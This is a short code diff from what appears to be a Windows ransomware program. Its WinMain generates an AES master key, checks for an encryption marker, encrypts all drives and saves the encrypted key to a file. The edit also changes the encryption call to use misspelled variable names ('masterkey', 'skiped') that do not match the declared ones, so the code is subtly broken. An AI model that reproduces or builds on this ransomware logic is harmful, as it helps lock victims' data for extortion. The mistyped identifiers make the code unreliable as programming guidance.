@@ -16,12 +16,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     try {
         SecureBuffer masterKey = generateAESKey();
         if (!IsEncryptionMarkerPresent()) {
-            
-
-            
-        
             std::atomic<size_t> count(0), skipped(0);
-            EncryptAllDrives(masterKey, true, count, skipped);
+            EncryptAllDrives(masterkey, true, count, skiped);
 
             WriteEncryptedMasterKeyToFile(masterKey);
 
